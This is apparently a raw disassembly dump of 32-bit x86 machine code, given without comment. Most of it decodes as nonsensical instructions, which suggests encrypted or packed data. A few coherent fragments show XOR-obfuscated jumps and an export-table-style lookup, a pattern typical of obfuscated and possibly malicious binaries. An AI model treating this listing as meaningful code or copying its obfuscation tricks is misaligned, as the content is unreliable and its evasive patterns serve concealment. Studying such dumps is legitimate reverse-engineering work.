  40fbd3:	xor    DWORD PTR [ebx-0x4f],0x64
  40fbd7:	xchg   DWORD PTR [ebx+ecx*2+0x7b],ecx
  40fbdb:	sbb    al,0x92
  40fbdd:	mov    edi,0x3e0e75b8
  40fbe2:	push   edx
  40fbe3:	or     al,BYTE PTR [ebp+0x13c51442]
  40fbe9:	and    eax,0x308499e1
  40fbee:	pop    es
  40fbef:	test   cl,al
  40fbf1:	and    eax,0x2f5f7ce6
  40fbf6:	pop    edi
  40fbf7:	stc    
  40fbf8:	mov    ebp,0xd3bfff75
  40fbfd:	cld    
  40fbfe:	inc    ecx
  40fbff:	xchg   BYTE PTR [edx-0x634f9b8],cl
  40fc05:	jecxz  0x40fc67
  40fc07:	out    0x72,al
  40fc09:	inc    edi
  40fc0a:	adc    eax,0x85920683
  40fc0f:	aad    0x14
  40fc11:	push   es
  40fc12:	fst    st(2)
  40fc14:	add    eax,0x76bef773
  40fc19:	pop    es
  40fc1a:	fisttp QWORD PTR [bp+di]
  40fc1d:	fnstenv [eax-0x25]
  40fc20:	(bad)  
  40fc21:	jae    0x40fc34
  40fc23:	mov    esp,0xcc57f7eb
  40fc28:	cmp    DWORD PTR [edx+edx*1-0x14ff099],ecx
  40fc2f:	mov    eax,ds:0x70b5680b
  40fc34:	adc    BYTE PTR ds:0xa2561110,ch
  40fc3a:	push   ebp
  40fc3b:	repz fdiv QWORD PTR [edi]
  40fc3e:	xchg   DWORD PTR [edx],edi
  40fc40:	xchg   edx,eax
  40fc41:	xchg   DWORD PTR [ebp-0x72b7649],esi
  40fc47:	out    0x1b,eax
  40fc49:	fld    QWORD PTR [eax+edx*8+0x36]
  40fc4d:	fnstenv [edx+0x30]
  40fc50:	mov    esp,0x26a2c75e
  40fc55:	pop    ecx
  40fc56:	or     DWORD PTR [ecx-0x5b],edx
  40fc59:	pop    esp
  40fc5a:	push   eax
  40fc5b:	cmp    BYTE PTR [esi],bh
  40fc5d:	inc    esp
  40fc5e:	mov    bh,0xb9
  40fc60:	pop    ss
  40fc61:	fsave  [edi-0x7a]
  40fc65:	lods   eax,DWORD PTR ds:[esi]
  40fc66:	jge    0x40fcb6
  40fc68:	mov    ch,0x13
  40fc6a:	mov    ebx,0x3132d435
  40fc6f:	xor    DWORD PTR [ebp+0x24],0xffffffb6
  40fc73:	sbb    eax,0xd1f1f9b1
  40fc78:	call   0x4ac8:0x30fc490c
  40fc7f:	add    BYTE PTR [eax+0x12],dh
  40fc82:	lds    ebx,FWORD PTR [eax+0x476b51f1]
  40fc88:	mov    eax,0xde022782
  40fc8d:	jne    0x40fc9c
  40fc8f:	mov    ebx,fs
  40fc91:	inc    edi
  40fc92:	xor    eax,0x84bc8712
  40fc97:	dec    edx
  40fc98:	lahf   
  40fc99:	fs stos BYTE PTR es:[edi],al
  40fc9b:	push   ss
  40fc9c:	rol    DWORD PTR [esi-0x4f],1
  40fc9f:	sub    eax,DWORD PTR [eax+0xbfe25ae]
  40fca5:	mov    al,0xb2
  40fca7:	push   eax
  40fca8:	lea    esi,fs:[edx-0x7d]
  40fcac:	sbb    DWORD PTR [edx+ecx*1],ebp
  40fcaf:	and    DWORD PTR [edi*2+0x7c8654c7],edi
  40fcb6:	sbb    ah,dl
  40fcb8:	int    0x7b
  40fcba:	retf   0x2b9e
  40fcbd:	cmc    
  40fcbe:	xchg   edx,eax
  40fcbf:	aad    0xb8
  40fcc1:	sub    BYTE PTR [ebx+0x7ba7a95d],dl
  40fcc7:	adc    eax,edx
  40fcc9:	daa    
  40fcca:	(bad)  
  40fccb:	sbb    eax,0xc6d8fcc2
  40fcd0:	sub    ecx,ecx
  40fcd2:	cmp    BYTE PTR [eax-0x14],cl
  40fcd5:	jb     0x40fc84
  40fcd7:	jae    0x40fc6b
  40fcd9:	mov    WORD PTR [eax-0x3e497c6b],?
  40fcdf:	gs xchg ebp,eax
  40fce1:	mov    BYTE PTR [esi],0x7d
  40fce4:	jno    0x40fc80
  40fce6:	hlt    
  40fce7:	gs xor dl,ch
  40fcea:	mov    ds:0x1441bb36,eax
  40fcef:	repnz cs cmp al,0xe0
  40fcf3:	adc    eax,DWORD PTR [eax-0x42942eb0]
  40fcf9:	data16 aaa 
  40fcfb:	and    cl,al
  40fcfd:	add    cl,cl
  40fcff:	add    al,0xf0
  40fd01:	or     al,0x8c
  40fd03:	jge    0x40fd1f
  40fd05:	ficom  DWORD PTR [ebp-0x1520386f]
  40fd0b:	pop    ebx
  40fd0c:	(bad)
  40fd0f:	pop    ds
  40fd10:	arpl   WORD PTR [ebx+0x5f40061f],si
  40fd16:	dec    eax
  40fd17:	aas    
  40fd18:	jae    0x40fd0c
  40fd1a:	xor    eax,0x7510855
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	idiv   BYTE PTR [esp+ecx*8+0x1f]
  40fd78:	fdiv   DWORD PTR [edi+0x7d497070]
  40fd7e:	jo     0x40fdf0
  40fd80:	mov    ss,WORD PTR [ecx-0x47]
  40fd83:	xlat   BYTE PTR ds:[ebx]
  40fd84:	and    ch,ch
  40fd86:	add    esi,DWORD PTR [edi-0x3abcc424]
  40fd8c:	lds    esp,FWORD PTR [eax-0x6d1dfd4e]
  40fd92:	pop    edx
  40fd93:	leave  
  40fd94:	jo     0x40fd34
  40fd96:	lea    edi,[esi]
  40fd98:	mov    ebx,DWORD PTR [ecx]
  40fd9a:	xor    bh,0x1e
  40fd9d:	pusha  
  40fd9e:	icebp  
  40fd9f:	push   esi
  40fda0:	fs jmp 0x375d34
  40fda6:	rcl    DWORD PTR [esi+0x46],1
  40fda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdaa:	test   al,0xfc
  40fdac:	sti    
  40fdad:	add    BYTE PTR [esi-0x56],0x73
  40fdb1:	je     0x40fe02
  40fdb3:	sub    eax,0x7a035d96
  40fdb8:	aam    0x15
  40fdba:	fadd   QWORD PTR [esi]
  40fdbc:	inc    eax
  40fdbd:	add    BYTE PTR [bx+si],ch
  40fdc0:	fisttp DWORD PTR [edi+0x4eec7e91]
  40fdc6:	mov    bl,BYTE PTR [ebp+0x19301eff]
  40fdcc:	and    cl,BYTE PTR [eax+0x3b]
  40fdcf:	(bad)  
  40fdd0:	mov    dh,BYTE PTR [ebx+0x6b838950]
  40fdd6:	jge    0x40fe1f
  40fdd8:	sub    eax,0x5cd841a1
  40fddd:	push   ecx
  40fdde:	jae    0x40fe13
  40fde0:	mov    ds:0x7b29f4d2,al
  40fde6:	inc    ebp
  40fde7:	fadd   st,st(4)
  40fde9:	dec    esp
  40fdea:	test   al,0xee
  40fdec:	mov    BYTE PTR [ebx],al
  40fdee:	mov    bl,BYTE PTR [edi+edx*1]
  40fdf1:	xchg   BYTE PTR [edx],dh
  40fdf3:	and    DWORD PTR [edx+0x18bef3c2],ebp
  40fdf9:	and    ah,ch
  40fdfb:	cdq    
  40fdfc:	test   DWORD PTR [ebx+0x3f],ebx
  40fdff:	jno    0x40fd89
  40fe01:	add    eax,0xffffff8f
  40fe04:	data16 mov WORD PTR [esi],es
  40fe07:	xor    esi,DWORD PTR [ebx]
  40fe09:	mov    ebp,0x933bd391
  40fe0e:	push   ds
  40fe0f:	jns    0x40fe66
  40fe11:	xor    cl,BYTE PTR [edi]
  40fe13:	cmp    eax,0x36e9a734
  40fe18:	and    eax,0x337f0131
  40fe1d:	mov    ah,0x68
  40fe1f:	mov    bl,0x0
  40fe21:	std    
  40fe22:	sub    DWORD PTR [ebx+0x7d4248a],edi
  40fe28:	xchg   edx,eax
  40fe29:	(bad)  
  40fe2b:	jg     0x40fe98
  40fe2d:	dec    ebx
  40fe2e:	sbb    eax,DWORD PTR [edx]
  40fe30:	mov    ebp,0x948983c7
  40fe35:	leave  
  40fe36:	cmp    esp,DWORD PTR [esi-0x52780971]
  40fe3c:	(bad)  [edx-0x5d1d5cac]
  40fe42:	xor    al,0xd3
  40fe44:	jmp    0xea02:0x10330271
  40fe4b:	rcr    BYTE PTR [ebx-0x5e90d3a0],1
  40fe51:	daa    
  40fe52:	jno    0x40fe56
  40fe54:	aaa    
  40fe55:	pop    es
  40fe56:	fisubr WORD PTR [edi-0x65]
  40fe59:	adc    BYTE PTR ds:0x21f935c5,bl
  40fe5f:	popf   
  40fe60:	(bad)  
  40fe62:	out    dx,eax
  40fe63:	test   DWORD PTR [ecx+0x7e7d66f3],edx
  40fe69:	xor    eax,0x3c60ff05
  40fe6e:	arpl   cx,si
  40fe70:	in     al,dx
  40fe71:	pop    ds
  40fe72:	sbb    ch,al
  40fe74:	jge    0x40fe96
  40fe76:	sub    al,0x76
  40fe78:	mov    al,0x58
  40fe7a:	jl     0x40fe5f
  40fe7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe7e:	(bad)  
  40fe7f:	stos   BYTE PTR es:[edi],al
  40fe80:	pop    edi
  40fe81:	xor    DWORD PTR [esi],0x3
  40fe84:	aas    
  40fe85:	xchg   ecx,eax
  40fe86:	sub    DWORD PTR [ebx+ebp*8-0x58],esi
  40fe8a:	xchg   DWORD PTR [eax],edx
  40fe8c:	adc    eax,0x3c38a5a6
  40fe91:	icebp  
  40fe92:	cmp    DWORD PTR [ebx],edx
  40fe94:	xor    cl,cl
  40fe96:	stc    
  40fe97:	icebp  
  40fe98:	mov    bh,0xfc
  40fe9a:	jge    0x40ff08
  40fe9c:	aad    0x95
  40fe9e:	mov    bl,BYTE PTR [ebp+ebx*2+0x34d76d61]
  40fea5:	jne    0x40fe57
  40fea7:	cs repnz xchg ecx,eax
  40feaa:	push   ecx
  40feab:	clc    
  40feac:	mov    ds:0x1404ac7d,al
  40feb1:	dec    edi
  40feb2:	inc    edi
  40feb3:	les    ebx,FWORD PTR [eax+0x49182f2b]
  40feb9:	iret   
  40feba:	ret    
  40febb:	cld    
  40febc:	and    edi,esp
  40febe:	dec    ecx
  40febf:	add    edi,DWORD PTR [edx-0x3de39764]
  40fec5:	inc    edx
  40fec6:	mov    edi,0x86488410
  40fecb:	out    dx,eax
  40fecc:	dec    eax
  40fecd:	scas   eax,DWORD PTR es:[edi]
  40fece:	jg     0x40fea0
  40fed0:	and    al,0x61
  40fed2:	pop    esi
  40fed3:	add    eax,esi
  40fed5:	adc    eax,0xc223dc0f
  40feda:	xchg   DWORD PTR [edx-0x71],ebp
  40fedd:	adc    bh,bh
  40fedf:	adc    eax,0x7803fb19
  40fee4:	cmp    al,0x43
  40fee6:	imul   ecx,DWORD PTR [ebp-0x58a4342c],0xffffff9e
  40feed:	or     DWORD PTR [edx+0x78f97702],0x57
  40fef4:	pusha  
  40fef5:	ins    DWORD PTR es:[edi],dx
  40fef6:	mov    edx,ebp
  40fef8:	fcmovbe st,st(6)
  40fefa:	sbb    BYTE PTR [esi],al
  40fefc:	rol    BYTE PTR [ecx+0x1d],cl
  40feff:	or     eax,0xde944f44
  40ff04:	jae    0x40ff1d
  40ff06:	or     al,0xbd
  40ff08:	xor    al,0x32
  40ff0a:	sub    eax,0x8fbb45d2
  40ff0f:	adc    BYTE PTR [ecx-0x4889c3ba],al
  40ff15:	sub    al,0x87
  40ff17:	ror    BYTE PTR [edi-0x566d997a],cl
  40ff1d:	jns    0x40ff3b
  40ff1f:	lea    ebx,[edx]
  40ff21:	popa   
  40ff22:	sahf   
  40ff23:	stos   DWORD PTR es:[edi],eax
  40ff24:	pop    ss
  40ff25:	sar    al,1
  40ff27:	lock scas al,BYTE PTR es:[edi]
  40ff29:	add    eax,0xc02e1ace
  40ff2e:	clc    
  40ff2f:	jne    0x40fedb
  40ff31:	sub    BYTE PTR [ebx-0x15],ch
  40ff34:	push   ebx
  40ff35:	sbb    BYTE PTR [ebp+0x8],ah
  40ff38:	ret    
  40ff39:	sub    edx,ecx
  40ff3b:	push   ecx
  40ff3c:	loope  0x40ff6a
  40ff3e:	cld    
  40ff3f:	stc    
  40ff40:	lock jg 0x40ffb8
  40ff43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff44:	dec    eax
  40ff45:	cwde   
  40ff46:	stc    
  40ff47:	ja     0x40ffb9
  40ff49:	inc    esi
  40ff4a:	mov    al,ds:0x92232ea9
  40ff4f:	and    BYTE PTR [ebp-0x173b184b],ah
  40ff55:	cmc    
  40ff56:	test   bh,cl
  40ff58:	icebp  
  40ff59:	stc    
  40ff5a:	shl    DWORD PTR [edx+0x36],1
  40ff5d:	jbe    0x40ffaf
  40ff5f:	ret    
  40ff60:	aas    
  40ff61:	int3   
  40ff62:	dec    BYTE PTR ds:0xd82be60
  40ff68:	ret    0x239
  40ff6b:	push   eax
  40ff6c:	iret   
  40ff6d:	je     0x40ffca
  40ff6f:	call   0xea620628
  40ff74:	adc    eax,0xfa374afc
  40ff79:	jl     0x40ff75
  40ff7b:	push   ebx
  40ff7c:	(bad)  
  40ff7d:	(bad)  
  40ff7e:	mov    ebp,0xfaadf830
  40ff83:	xchg   esp,eax
  40ff84:	add    DWORD PTR [edx+0x6a],edx
  40ff87:	pop    ds
  40ff88:	xchg   esp,eax
  40ff89:	xor    ch,bl
  40ff8b:	jle    0x41000c
  40ff8d:	and    al,0x31
  40ff8f:	dec    edx
  40ff90:	and    DWORD PTR [eax+0x2f928f1e],edi
  40ff96:	jns    0x40ffa1
  40ff98:	xor    eax,0x96c06bdd
  40ff9d:	iret   
  40ff9e:	xchg   ecx,edx
  40ffa0:	cmp    ecx,DWORD PTR [eax+ecx*2+0xe75f59]
  40ffa7:	cmp    edi,esp
  40ffa9:	mov    cl,0x92
  40ffab:	es stc 
  40ffad:	jmp    0x11961b1a
  40ffb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb3:	loopne 0x40ff9a
  40ffb5:	mov    dh,BYTE PTR [ebp+0x60]
  40ffb8:	sbb    ch,BYTE PTR [edx+0x36]
  40ffbb:	cmp    BYTE PTR [edi-0x60183e59],al
  40ffc1:	mov    ah,0x5
  40ffc3:	es adc eax,0x7d6e33c5
  40ffc9:	in     al,dx
  40ffca:	call   0x4721c095
  40ffcf:	(bad)  
  40ffd0:	enter  0x6daa,0x91
  40ffd4:	inc    edx
  40ffd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffd6:	mov    cl,0xc2
  40ffd8:	clc    
  40ffd9:	mov    al,0xd7
  40ffdb:	dec    ecx
  40ffdc:	cmp    BYTE PTR [eax-0x54],al
  40ffdf:	push   edx
  40ffe0:	hlt    
  40ffe1:	cmc    
  40ffe2:	in     al,0x2c
  40ffe4:	xor    DWORD PTR [ebx],edx
  40ffe6:	das    
  40ffe7:	jo     0x40ffd1
  40ffe9:	test   eax,0xa429625
  40ffee:	repz xlat BYTE PTR cs:[ebx]
  40fff1:	ror    BYTE PTR [esi+0x40],0x80
  40fff5:	rol    dh,cl
  40fff7:	retf   0xc298
  40fffa:	sbb    ecx,DWORD PTR [eax-0x7e556237]
  410000:	sbb    DWORD PTR [ecx+0x20],0x2c283425
  410007:	mov    ah,BYTE PTR [ebx]
  410009:	xchg   esi,eax
  41000a:	mov    ecx,0x34b80215
  41000f:	(bad)  
  410010:	sub    edi,DWORD PTR [eax+0x668b7b06]
  410016:	lods   eax,DWORD PTR ds:[esi]
  410017:	ret    0xa361
  41001a:	add    dl,BYTE PTR [eax+eiz*2]
  41001d:	(bad)  
  41001e:	jecxz  0x410069
  410020:	xor    ebx,0xffffff9e
  410023:	test   BYTE PTR [edx],bh
  410025:	mov    ecx,0xc2f4ad84
  41002a:	es pop esp
  41002c:	cmp    esi,esp
  41002e:	cs dec ebp
  410030:	pop    DWORD PTR [ebp-0x8908c79]
  410036:	scas   al,BYTE PTR es:[edi]
  410037:	lea    ebp,[eax-0x60e55303]
  41003d:	rcr    BYTE PTR [eax+0x6e11bb35],cl
  410043:	loop   0x410028
  410045:	xchg   BYTE PTR [esi-0x2e],cl
  410048:	mov    esi,0xd1eaa1d9
  41004d:	inc    edi
  41004e:	inc    edi
  41004f:	sub    ch,BYTE PTR ss:[edx+0x77]
  410053:	scas   al,BYTE PTR es:[edi]
  410054:	call   0x276f:0xae27e86
  41005b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41005c:	ja     0x410051
  41005e:	inc    ebp
  41005f:	add    al,0x30
  410061:	arpl   WORD PTR [ecx-0x38],cx
  410064:	jle    0x410057
  410066:	push   es
  410067:	sbb    edx,DWORD PTR [ecx+ebx*4+0x6d]
  41006b:	mov    ebx,0x8eaa7f67
  410070:	or     DWORD PTR [ebx+0x6d],0x11
  410074:	jge    0x41007b
  410076:	dec    esp
  410077:	or     cl,bl
  410079:	hlt    
  41007a:	inc    ecx
  41007b:	pop    edx
  41007c:	ja     0x41007c
  41007e:	fbstp  TBYTE PTR [esi-0x37c553a3]
  410084:	lods   al,BYTE PTR ds:[esi]
  410085:	mov    edi,0x430483e8
  41008a:	sti    
  41008b:	cmp    DWORD PTR [edx+0x70],eax
  41008e:	addr16 loop 0x4100ae
  410091:	mov    cl,BYTE PTR [edi]
  410093:	test   BYTE PTR [esi+0x7f],dl
  410096:	out    dx,eax
  410097:	push   edx
  410098:	or     dh,BYTE PTR [ebx+0x4e0d7e5c]
  41009e:	dec    ebx
  41009f:	stos   DWORD PTR es:[edi],eax
  4100a0:	popf   
  4100a1:	xor    al,0x2f
  4100a3:	inc    ebp
  4100a4:	addr16 js 0x410058
  4100a7:	xchg   ebx,eax
  4100a8:	inc    ecx
  4100a9:	sub    al,0xb7
  4100ab:	iret   
  4100ac:	pop    edx
  4100ad:	loop   0x41007c
  4100af:	loopne 0x4100c0
  4100b1:	int3   
  4100b2:	fimul  DWORD PTR [eax+eax*8+0x51]
  4100b6:	int3   
  4100b7:	and    edx,DWORD PTR [edx-0x27]
  4100ba:	cmp    ebx,esi
  4100bc:	ja     0x410099
  4100be:	jmp    0x511e4ca9
  4100c3:	jle    0x4100c5
  4100c5:	stos   BYTE PTR es:[edi],al
  4100c6:	fisttp QWORD PTR [eax+0x966cd0a]
  4100cc:	push   ds
  4100cd:	mov    eax,0x7bbc6e5
  4100d2:	inc    BYTE PTR [edx]
  4100d4:	adc    DWORD PTR [ecx+0x70b58f86],ebp
  4100da:	imul   eax,DWORD PTR [ebx+eax*4],0x76
  4100de:	add    ecx,DWORD PTR [edi+0x3e]
  4100e1:	enter  0x73a3,0x9b
  4100e5:	push   ebp
  4100e6:	ret    
  4100e7:	cmc    
  4100e8:	push   ebx
  4100e9:	push   edx
  4100ea:	push   ecx
  4100eb:	jg     0x4100e1
  4100ed:	jp     0x4100c0
  4100ef:	repnz sub al,0x2d
  4100f2:	stos   BYTE PTR es:[edi],al
  4100f3:	mov    ecx,0xe79e7ad9
  4100f8:	fs mov bh,0x8
  4100fb:	dec    ecx
  4100fc:	xor    BYTE PTR ds:0xed12c7e,ah
  410102:	sbb    al,0x92
  410104:	push   es
  410105:	std    
  410106:	or     al,0xd0
  410108:	imul   ecx,DWORD PTR [edx+0x1],0x1
  41010c:	xchg   BYTE PTR [ecx],al
  41010e:	jmp    0x9ea6:0x84f17849
  410115:	add    eax,0x40bad78
  41011a:	push   ds
  41011b:	push   eax
  41011c:	aad    0x4b
  41011e:	enter  0x88c6,0xe
  410122:	mov    ds:0xa3df92dd,eax
  410127:	and    bl,al
  410129:	jno    0x4100af
  41012b:	jl     0x4100ee
  41012d:	ss adc al,0x1a
  410131:	and    ah,ch
  410133:	cmp    BYTE PTR [ebx-0xa2a1592],ch
  410139:	dec    eax
  41013a:	retf   
  41013b:	inc    edi
  41013c:	pop    ebx
  41013d:	ficom  DWORD PTR [esi]
  41013f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410140:	sbb    esi,DWORD PTR [edx]
  410142:	dec    eax
  410143:	sti    
  410144:	aaa    
  410145:	std    
  410146:	push   esp
  410147:	push   cs
  410148:	inc    ecx
  410149:	call   esp
  41014b:	sbb    esi,DWORD PTR [ecx+0x5b]
  41014e:	inc    eax
  41014f:	fiadd  WORD PTR [ebp+eiz*2+0x5a]
  410153:	mov    al,0x6d
  410155:	mul    BYTE PTR [edi+0x3b]
  410158:	enter  0x850f,0xd
  41015c:	add    BYTE PTR [eax],al
  41015e:	add    BYTE PTR [ebx+0x5535fc45],cl
  410164:	or     BYTE PTR [ecx+0x7],dl
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	xchg   ebp,eax
  41018a:	arpl   WORD PTR [eax-0x1f],bp
  41018d:	xor    DWORD PTR [ebx+0x7d497070],esi
  410193:	jo     0x410205
  410195:	mov    edi,DWORD PTR [ebx+0x546abfcd]
  41019b:	mov    dh,0x4f
  41019d:	jmp    0x4101a8
  41019f:	xchg   ebp,eax
  4101a0:	push   ebx
  4101a1:	jnp    0x4101f7
  4101a3:	pop    es
  4101a4:	xchg   ebx,eax
  4101a5:	and    DWORD PTR [esi+0x4a],ebp
  4101a8:	lock sub eax,0xd4e814e7
  4101ae:	cmp    DWORD PTR [edx],eax
  4101b0:	ds pop ds
  4101b2:	xor    eax,0x59157799
  4101b7:	dec    edx
  4101b8:	aas    
  4101b9:	sub    BYTE PTR [edx+ebp*2-0x2b],al
  4101bd:	add    al,0x5
  4101bf:	lahf   
  4101c0:	call   0x690:0x27d29933
  4101c7:	mov    esi,ecx
  4101c9:	dec    esp
  4101ca:	(bad)  
  4101cb:	sti    
  4101cc:	ret    0x2ec5
  4101cf:	sbb    bh,BYTE PTR [ecx+0x72]
  4101d2:	outs   dx,DWORD PTR ds:[esi]
  4101d3:	adc    dl,BYTE PTR [eax-0x80]
  4101d6:	mov    esi,0xa0b9fad3
  4101db:	les    edi,FWORD PTR [edx-0x679b77a]
  4101e1:	dec    ecx
  4101e2:	and    eax,0x4df05b15
  4101e7:	je     0x410225
  4101e9:	jo     0x410256
  4101eb:	xchg   bh,ch
  4101ed:	xchg   DWORD PTR [edx+0x43],eax
  4101f0:	(bad)  
  4101f1:	les    edx,FWORD PTR [edx]
  4101f3:	jg     0x410265
  4101f5:	pop    ebx
  4101f6:	ins    DWORD PTR es:[edi],dx
  4101f7:	sar    BYTE PTR [eax+0x5438f87f],1
  4101fd:	push   cs
  4101fe:	and    eax,0x6a20daa3
  410203:	shl    BYTE PTR [ecx-0x61],0x48
  410207:	jge    0x4101fc
  410209:	loope  0x4101aa
  41020b:	int3   
  41020c:	mov    ebp,0xf8572ea8
  410211:	fstp   QWORD PTR [edx-0x49]
  410214:	(bad)  
  410215:	icebp  
  410216:	std    
  410217:	fldenv [esi-0x637a1a4e]
  41021d:	mov    al,0xd2
  41021f:	ror    DWORD PTR [edi+0x52efaa15],0x25
  410226:	push   ds
  410227:	xchg   DWORD PTR [edi],eax
  410229:	sbb    BYTE PTR [eax],al
  41022b:	sbb    BYTE PTR [edi-0x63],0x50
  41022f:	or     ah,BYTE PTR [esp+ecx*2]
  410232:	adc    eax,0xcd4c33f5
  410237:	mov    BYTE PTR [edx+0x3b30ae8a],0x4a
  41023e:	mov    ds:0x880cc6f6,eax
  410243:	pop    ebx
  410244:	mov    BYTE PTR [eax],cl
  410246:	mov    edx,DWORD PTR [ebx]
  410248:	cwde   
  410249:	in     eax,dx
  41024a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41024b:	push   eax
  41024c:	inc    ebp
  41024d:	fimul  WORD PTR [edx]
  41024f:	sub    ebp,0xffffffda
  410252:	ja     0x4102bb
  410254:	inc    eax
  410255:	ret    0x95c1
  410258:	repnz es mov dh,0xe2
  41025c:	lahf   
  41025d:	outs   dx,DWORD PTR ds:[esi]
  41025e:	sub    ebx,ecx
  410260:	jnp    0x410296
  410262:	and    DWORD PTR [edx-0x1e80b80a],0xfffffffd
  410269:	mov    dl,0xca
  41026b:	and    DWORD PTR [eax],0x6e
  41026e:	lock out dx,al
  410270:	cmp    eax,0xca8ed443
  410275:	outs   dx,DWORD PTR ds:[esi]
  410276:	loop   0x410261
  410278:	sbb    dh,BYTE PTR [eax-0x134a6900]
  41027e:	stos   BYTE PTR es:[edi],al
  41027f:	inc    edx
  410280:	fsubr  st,st(0)
  410282:	and    DWORD PTR [eax+esi*4],esp
  410285:	cmp    eax,0xc2a96918
  41028a:	cwde   
  41028b:	cwde   
  41028c:	and    BYTE PTR [edi-0x59dd042a],al
  410292:	sub    al,BYTE PTR [eax-0x4c]
  410295:	stos   DWORD PTR es:[edi],eax
  410296:	(bad)  [edx]
  410298:	jo     0x4102b9
  41029a:	ret    0xef60
  41029d:	ins    DWORD PTR es:[edi],dx
  41029e:	pop    ebp
  41029f:	hlt    
  4102a0:	push   ebx
  4102a1:	fistp  DWORD PTR [ebp+0x63ffb049]
  4102a7:	inc    ebp
  4102a8:	into   
  4102a9:	sbb    al,ah
  4102ab:	and    eax,0x517deb76
  4102b0:	mov    dl,BYTE PTR [esi]
  4102b2:	in     eax,dx
  4102b3:	xor    bl,ah
  4102b5:	es stc 
  4102b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102b8:	stos   DWORD PTR es:[edi],eax
  4102b9:	fcom   DWORD PTR ds:0x798a83e7
  4102bf:	or     al,0x13
  4102c1:	inc    esi
  4102c2:	addr16 sti 
  4102c4:	sub    dh,al
  4102c6:	add    DWORD PTR [esi],0x26
  4102c9:	in     eax,dx
  4102ca:	or     ecx,DWORD PTR [ebp+0x727c92d2]
  4102d0:	xlat   BYTE PTR ds:[ebx]
  4102d1:	loop   0x4102cb
  4102d3:	or     eax,0xfc9a1f60
  4102d8:	sets   BYTE PTR [ebx+0x55]
  4102dc:	pop    eax
  4102dd:	dec    ecx
  4102de:	imul   eax,DWORD PTR [ebp-0x12],0x9ea18aa2
  4102e5:	mov    eax,0x2049fb76
  4102ea:	shl    DWORD PTR [ecx-0x4080c8e7],cl
  4102f0:	mov    eax,ds:0xa30e3b7a
  4102f5:	xchg   ecx,eax
  4102f6:	push   0x9da7287
  4102fb:	(bad)  
  4102fc:	mov    ebp,0xf2e67254
  410301:	inc    esi
  410302:	xor    edx,DWORD PTR [ebx-0x5f4ca515]
  410308:	mov    esp,0x67fa2903
  41030d:	mov    WORD PTR [edx-0x300bb01a],ss
  410313:	enter  0x1c52,0xd8
  410317:	cmp    eax,0x72a3b68
  41031c:	sbb    eax,DWORD PTR [ecx+edx*8]
  41031f:	cmp    ah,BYTE PTR [esi+0x4c]
  410322:	mov    esi,es
  410324:	in     eax,dx
  410325:	stc    
  410326:	cmp    ebx,eax
  410328:	dec    esp
  410329:	or     ebx,DWORD PTR [ebx+0x40]
  41032c:	mov    eax,0x4884ec00
  410331:	(bad)
  410335:	mov    al,ds:0xd721dd8a
  41033a:	lea    ebp,[ebx+esi*1-0x3419454a]
  410341:	mov    ch,0x44
  410343:	add    bl,bh
  410345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410346:	leave  
  410347:	mov    ds:0x6762dc34,eax
  41034c:	or     esi,DWORD PTR [ebx+0x38f846e0]
  410352:	cmp    BYTE PTR [ebp-0xe],0x3c
  410356:	mov    dh,0x1e
  410358:	in     eax,dx
  410359:	imul   ecx,DWORD PTR [esi-0x1719e225],0xffffffcf
  410360:	cmp    BYTE PTR [ecx+0x5fdb90f3],ch
  410366:	inc    ecx
  410367:	or     eax,0xb410ea5a
  41036c:	sbb    al,0x64
  41036e:	sbb    DWORD PTR [eax-0x19c516e9],ebp
  410374:	fcmovnb st,st(0)
  410376:	scas   eax,DWORD PTR es:[edi]
  410377:	push   esi
  410378:	loopne 0x410365
  41037a:	in     eax,0x3d
  41037c:	test   eax,0x3fa8f77b
  410381:	push   esi
  410382:	xchg   ebp,eax
  410383:	retf   0x4aac
  410386:	loop   0x410376
  410388:	cmc    
  410389:	inc    ecx
  41038a:	sahf   
  41038b:	rcr    BYTE PTR [eax],1
  41038d:	cli    
  41038e:	sub    al,BYTE PTR [esi+0x49d5940b]
  410394:	(bad)  
  410395:	fadd   QWORD PTR [edi-0x3f]
  410398:	jle    0x41034e
